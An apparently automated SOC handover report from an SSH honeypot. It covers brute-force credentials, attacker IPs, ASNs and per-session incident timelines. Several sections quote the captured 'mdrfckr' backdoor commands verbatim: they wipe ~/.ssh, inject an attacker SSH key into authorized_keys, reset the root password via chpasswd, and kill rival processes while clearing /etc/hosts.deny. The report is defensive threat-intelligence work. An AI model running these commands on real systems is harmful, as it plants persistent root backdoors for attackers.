# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-07 |
| **Generated At** | 2026-04-07T20:44:26Z |
| **Shift Time** | 20:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **57** |
| Confirmed Threats | **55** |
| False Positives Filtered | **2** (3.5%) |
| Unique Attacker IPs | **14** |
| Countries of Origin | **7** |
| High Severity Cases | **18** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **39** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **45** |
| Unique Credential Pairs | **35** |
| Unique Usernames | **16** |
| Unique Passwords | **34** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 18 |
| `345gs5662d34` | 6 |
| `ubuntu` | 5 |
| `ftpuser` | 2 |
| `alex` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `root` | 2 |
| `qwert` | 1 |
| `root24!` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `ubuntu` | `qwert` | 1 |
| `root` | `root24!` | 1 |
| `ftpuser` | `1q2w3e4r` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root24!` | `70.54.182.130` | 2026-04-07T19:29:24 |
| `root` | `3245gs5662d34` | `70.54.182.130` | 2026-04-07T19:29:31 |
| `root` | `Asd123123` | `2.27.63.102` | 2026-04-07T19:36:59 |
| `root` | `admin12345678.` | `2.27.63.102` | 2026-04-07T19:41:46 |
| `root` | `password123` | `2.27.63.102` | 2026-04-07T19:44:05 |
| `root` | `3245gs5662d34` | `2.27.63.102` | 2026-04-07T19:44:14 |
| `root` | `asdqwe123!` | `2.27.63.102` | 2026-04-07T19:53:36 |
| `root` | `root12@#` | `2.27.63.102` | 2026-04-07T19:56:00 |
| `root` | `Abc123456*` | `2.27.63.102` | 2026-04-07T19:58:24 |
| `root` | `root999.` | `2.27.63.102` | 2026-04-07T20:07:50 |
| `root` | `Qazwsx4321!` | `2.27.63.102` | 2026-04-07T20:10:14 |
| `root` | `Aa000000` | `2.27.63.102` | 2026-04-07T20:12:33 |
| `root` | `6yhn#$` | `2.27.63.102` | 2026-04-07T20:26:38 |
| `root` | `xxBB123123` | `202.165.29.174` | 2026-04-07T20:26:50 |
| `root` | `3245gs5662d34` | `202.165.29.174` | 2026-04-07T20:26:53 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **57** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 51 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 49 | 7 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 49 | 7 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 2 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:5Fp8Y58qvXwq"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `2.27.63.102`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `70.54.182.130`, `202.165.29.174`, `2.27.63.102`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **14** |
| Unique ASNs | **10** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | HIGH |
| `AS577` | Bell Canada | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS1257` | Tele2 Sverige AB | 1 | MEDIUM |
| `AS1267` | WIND TRE S.P.A. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (18)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0bcd0dba90a0

| Field | Detail |
|---|---|
| **Source IP** | `70.54.182[.]130` |
| **First Seen** | 2026-04-07 19:29 |
| **Last Seen** | 2026-04-07 19:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 19:29:23` | `cowrie.session.connect` |
| `2026-04-07 19:29:23` | `cowrie.client.version` |
| `2026-04-07 19:29:23` | `cowrie.client.kex` |
| `2026-04-07 19:29:24` | `cowrie.login.success` |
| `2026-04-07 19:29:25` | `cowrie.session.params` |
| `2026-04-07 19:29:25` | `cowrie.command.input` |
| `2026-04-07 19:29:25` | `cowrie.command.failed` |
| `2026-04-07 19:29:25` | `cowrie.log.closed` |
| `2026-04-07 19:29:25` | `cowrie.session.params` |
| `2026-04-07 19:29:25` | `cowrie.command.input` |
| `2026-04-07 19:29:26` | `cowrie.session.file_download` |
| `2026-04-07 19:29:26` | `cowrie.log.closed` |
| `2026-04-07 19:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.54.182[.]130` to AbuseIPDB if not already reported
- [ ] Block `70.54.182[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8975cd18b546

| Field | Detail |
|---|---|
| **Source IP** | `70.54.182[.]130` |
| **First Seen** | 2026-04-07 19:29 |
| **Last Seen** | 2026-04-07 19:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 19:29:30` | `cowrie.session.connect` |
| `2026-04-07 19:29:30` | `cowrie.client.version` |
| `2026-04-07 19:29:30` | `cowrie.client.kex` |
| `2026-04-07 19:29:31` | `cowrie.login.success` |
| `2026-04-07 19:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.54.182[.]130` to AbuseIPDB if not already reported
- [ ] Block `70.54.182[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4552d3e64f6

| Field | Detail |
|---|---|
| **Source IP** | `2.27.63[.]102` |
| **First Seen** | 2026-04-07 19:36 |
| **Last Seen** | 2026-04-07 19:37 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:5Fp8Y58qvXwq"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 19:36:58` | `cowrie.session.connect` |
| `2026-04-07 19:36:58` | `cowrie.client.version` |
| `2026-04-07 19:36:58` | `cowrie.client.kex` |
| `2026-04-07 19:36:59` | `cowrie.login.success` |
| `2026-04-07 19:37:00` | `cowrie.session.params` |
| `2026-04-07 19:37:00` | `cowrie.command.input` |
| `2026-04-07 19:37:00` | `cowrie.command.failed` |
| `2026-04-07 19:37:00` | `cowrie.log.closed` |
| `2026-04-07 19:37:01` | `cowrie.session.params` |
| `2026-04-07 19:37:01` | `cowrie.command.input` |
| `2026-04-07 19:37:01` | `cowrie.session.file_download` |
| `2026-04-07 19:37:01` | `cowrie.log.closed` |
| `2026-04-07 19:37:14` | `cowrie.session.params` |
| `2026-04-07 19:37:14` | `cowrie.command.input` |
| `2026-04-07 19:37:14` | `cowrie.log.closed` |
| `2026-04-07 19:37:15` | `cowrie.session.params` |
| `2026-04-07 19:37:15` | `cowrie.command.input` |
| `2026-04-07 19:37:15` | `cowrie.log.closed` |
| `2026-04-07 19:37:16` | `cowrie.session.params` |
| `2026-04-07 19:37:16` | `cowrie.command.input` |
| `2026-04-07 19:37:16` | `cowrie.session.file_download` |
| `2026-04-07 19:37:16` | `cowrie.log.closed` |
| `2026-04-07 19:37:17` | `cowrie.session.params` |
| `2026-04-07 19:37:17` | `cowrie.command.input` |
| `2026-04-07 19:37:17` | `cowrie.log.closed` |
| `2026-04-07 19:37:18` | `cowrie.session.params` |
| `2026-04-07 19:37:18` | `cowrie.command.input` |
| `2026-04-07 19:37:18` | `cowrie.log.closed` |
| `2026-04-07 19:37:19` | `cowrie.session.params` |
| `2026-04-07 19:37:19` | `cowrie.command.input` |
| `2026-04-07 19:37:19` | `cowrie.command.input` |
| `2026-04-07 19:37:19` | `cowrie.log.closed` |
| `2026-04-07 19:37:20` | `cowrie.session.params` |
| `2026-04-07 19:37:20` | `cowrie.command.input` |
| `2026-04-07 19:37:20` | `cowrie.log.closed` |
| `2026-04-07 19:37:21` | `cowrie.session.params` |
| `2026-04-07 19:37:21` | `cowrie.command.input` |
| `2026-04-07 19:37:21` | `cowrie.log.closed` |
| `2026-04-07 19:37:22` | `cowrie.session.params` |
| `2026-04-07 19:37:22` | `cowrie.command.input` |
| `2026-04-07 19:37:22` | `cowrie.log.closed` |
| `2026-04-07 19:37:23` | `cowrie.session.params` |
| `2026-04-07 19:37:23` | `cowrie.command.input` |
| `2026-04-07 19:37:23` | `cowrie.log.closed` |
| `2026-04-07 19:37:24` | `cowrie.session.params` |
| `2026-04-07 19:37:24` | `cowrie.command.input` |
| `2026-04-07 19:37:24` | `cowrie.log.closed` |
| `2026-04-07 19:37:25` | `cowrie.session.params` |
| `2026-04-07 19:37:25` | `cowrie.command.input` |
| `2026-04-07 19:37:25` | `cowrie.log.closed` |
| `2026-04-07 19:37:26` | `cowrie.session.params` |
| `2026-04-07 19:37:26` | `cowrie.command.input` |
| `2026-04-07 19:37:26` | `cowrie.log.closed` |
| `2026-04-07 19:37:27` | `cowrie.session.params` |
| `2026-04-07 19:37:27` | `cowrie.command.input` |
| `2026-04-07 19:37:27` | `cowrie.log.closed` |
| `2026-04-07 19:37:28` | `cowrie.session.params` |
| `2026-04-07 19:37:28` | `cowrie.command.input` |
| `2026-04-07 19:37:28` | `cowrie.log.closed` |
| `2026-04-07 19:37:29` | `cowrie.session.params` |
| `2026-04-07 19:37:29` | `cowrie.command.input` |
| `2026-04-07 19:37:29` | `cowrie.log.closed` |
| `2026-04-07 19:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.63[.]102` to AbuseIPDB if not already reported
- [ ] Block `2.27.63[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f254f95a8b0

| Field | Detail |
|---|---|
| **Source IP** | `2.27.63[.]102` |
| **First Seen** | 2026-04-07 19:41 |
| **Last Seen** | 2026-04-07 19:42 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:YVmJ6T6Q0Xlc"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 19:41:45` | `cowrie.session.connect` |
| `2026-04-07 19:41:45` | `cowrie.client.version` |
| `2026-04-07 19:41:45` | `cowrie.client.kex` |
| `2026-04-07 19:41:46` | `cowrie.login.success` |
| `2026-04-07 19:41:47` | `cowrie.session.params` |
| `2026-04-07 19:41:47` | `cowrie.command.input` |
| `2026-04-07 19:41:47` | `cowrie.command.failed` |
| `2026-04-07 19:41:47` | `cowrie.log.closed` |
| `2026-04-07 19:41:48` | `cowrie.session.params` |
| `2026-04-07 19:41:48` | `cowrie.command.input` |
| `2026-04-07 19:41:48` | `cowrie.session.file_download` |
| `2026-04-07 19:41:48` | `cowrie.log.closed` |
| `2026-04-07 19:42:01` | `cowrie.session.params` |
| `2026-04-07 19:42:01` | `cowrie.command.input` |
| `2026-04-07 19:42:01` | `cowrie.log.closed` |
| `2026-04-07 19:42:02` | `cowrie.session.params` |
| `2026-04-07 19:42:02` | `cowrie.command.input` |
| `2026-04-07 19:42:02` | `cowrie.log.closed` |
| `2026-04-07 19:42:03` | `cowrie.session.params` |
| `2026-04-07 19:42:03` | `cowrie.command.input` |
| `2026-04-07 19:42:03` | `cowrie.session.file_download` |
| `2026-04-07 19:42:03` | `cowrie.log.closed` |
| `2026-04-07 19:42:04` | `cowrie.session.params` |
| `2026-04-07 19:42:04` | `cowrie.command.input` |
| `2026-04-07 19:42:04` | `cowrie.log.closed` |
| `2026-04-07 19:42:05` | `cowrie.session.params` |
| `2026-04-07 19:42:05` | `cowrie.command.input` |
| `2026-04-07 19:42:05` | `cowrie.log.closed` |
| `2026-04-07 19:42:06` | `cowrie.session.params` |
| `2026-04-07 19:42:06` | `cowrie.command.input` |
| `2026-04-07 19:42:06` | `cowrie.command.input` |
| `2026-04-07 19:42:06` | `cowrie.log.closed` |
| `2026-04-07 19:42:07` | `cowrie.session.params` |
| `2026-04-07 19:42:07` | `cowrie.command.input` |
| `2026-04-07 19:42:07` | `cowrie.log.closed` |
| `2026-04-07 19:42:08` | `cowrie.session.params` |
| `2026-04-07 19:42:08` | `cowrie.command.input` |
| `2026-04-07 19:42:08` | `cowrie.log.closed` |
| `2026-04-07 19:42:09` | `cowrie.session.params` |
| `2026-04-07 19:42:09` | `cowrie.command.input` |
| `2026-04-07 19:42:09` | `cowrie.log.closed` |
| `2026-04-07 19:42:10` | `cowrie.session.params` |
| `2026-04-07 19:42:10` | `cowrie.command.input` |
| `2026-04-07 19:42:10` | `cowrie.log.closed` |
| `2026-04-07 19:42:11` | `cowrie.session.params` |
| `2026-04-07 19:42:11` | `cowrie.command.input` |
| `2026-04-07 19:42:11` | `cowrie.log.closed` |
| `2026-04-07 19:42:12` | `cowrie.session.params` |
| `2026-04-07 19:42:12` | `cowrie.command.input` |
| `2026-04-07 19:42:12` | `cowrie.log.closed` |
| `2026-04-07 19:42:13` | `cowrie.session.params` |
| `2026-04-07 19:42:13` | `cowrie.command.input` |
| `2026-04-07 19:42:13` | `cowrie.log.closed` |
| `2026-04-07 19:42:14` | `cowrie.session.params` |
| `2026-04-07 19:42:14` | `cowrie.command.input` |
| `2026-04-07 19:42:14` | `cowrie.log.closed` |
| `2026-04-07 19:42:16` | `cowrie.session.params` |
| `2026-04-07 19:42:16` | `cowrie.command.input` |
| `2026-04-07 19:42:16` | `cowrie.log.closed` |
| `2026-04-07 19:42:17` | `cowrie.session.params` |
| `2026-04-07 19:42:17` | `cowrie.command.input` |
| `2026-04-07 19:42:17` | `cowrie.log.closed` |
| `2026-04-07 19:42:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.63[.]102` to AbuseIPDB if not already reported
- [ ] Block `2.27.63[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-637f9ef4d3eb

| Field | Detail |
|---|---|
| **Source IP** | `2.27.63[.]102` |
| **First Seen** | 2026-04-07 19:44 |
| **Last Seen** | 2026-04-07 19:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 19:44:04` | `cowrie.session.connect` |
| `2026-04-07 19:44:04` | `cowrie.client.version` |
| `2026-04-07 19:44:04` | `cowrie.client.kex` |
| `2026-04-07 19:44:05` | `cowrie.login.success` |
| `2026-04-07 19:44:06` | `cowrie.session.params` |
| `2026-04-07 19:44:06` | `cowrie.command.input` |
| `2026-04-07 19:44:06` | `cowrie.command.failed` |
| `2026-04-07 19:44:06` | `cowrie.log.closed` |
| `2026-04-07 19:44:07` | `cowrie.session.params` |
| `2026-04-07 19:44:07` | `cowrie.command.input` |
| `2026-04-07 19:44:07` | `cowrie.session.file_download` |
| `2026-04-07 19:44:07` | `cowrie.log.closed` |
| `2026-04-07 19:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.63[.]102` to AbuseIPDB if not already reported
- [ ] Block `2.27.63[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eb0d93a76f2

| Field | Detail |
|---|---|
| **Source IP** | `2.27.63[.]102` |
| **First Seen** | 2026-04-07 19:44 |
| **Last Seen** | 2026-04-07 19:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 19:44:12` | `cowrie.session.connect` |
| `2026-04-07 19:44:12` | `cowrie.client.version` |
| `2026-04-07 19:44:12` | `cowrie.client.kex` |
| `2026-04-07 19:44:14` | `cowrie.login.success` |
| `2026-04-07 19:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.63[.]102` to AbuseIPDB if not already reported
- [ ] Block `2.27.63[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d95518a29107

| Field | Detail |
|---|---|
| **Source IP** | `2.27.63[.]102` |
| **First Seen** | 2026-04-07 19:53 |
| **Last Seen** | 2026-04-07 19:54 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:JpGFtRYtx1BA"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 19:53:35` | `cowrie.session.connect` |
| `2026-04-07 19:53:35` | `cowrie.client.version` |
| `2026-04-07 19:53:35` | `cowrie.client.kex` |
| `2026-04-07 19:53:36` | `cowrie.login.success` |
| `2026-04-07 19:53:37` | `cowrie.session.params` |
| `2026-04-07 19:53:37` | `cowrie.command.input` |
| `2026-04-07 19:53:37` | `cowrie.command.failed` |
| `2026-04-07 19:53:37` | `cowrie.log.closed` |
| `2026-04-07 19:53:38` | `cowrie.session.params` |
| `2026-04-07 19:53:38` | `cowrie.command.input` |
| `2026-04-07 19:53:38` | `cowrie.session.file_download` |
| `2026-04-07 19:53:38` | `cowrie.log.closed` |
| `2026-04-07 19:53:51` | `cowrie.session.params` |
| `2026-04-07 19:53:51` | `cowrie.command.input` |
| `2026-04-07 19:53:51` | `cowrie.log.closed` |
| `2026-04-07 19:53:52` | `cowrie.session.params` |
| `2026-04-07 19:53:52` | `cowrie.command.input` |
| `2026-04-07 19:53:52` | `cowrie.log.closed` |
| `2026-04-07 19:53:53` | `cowrie.session.params` |
| `2026-04-07 19:53:53` | `cowrie.command.input` |
| `2026-04-07 19:53:53` | `cowrie.session.file_download` |
| `2026-04-07 19:53:53` | `cowrie.log.closed` |
| `2026-04-07 19:53:55` | `cowrie.session.params` |
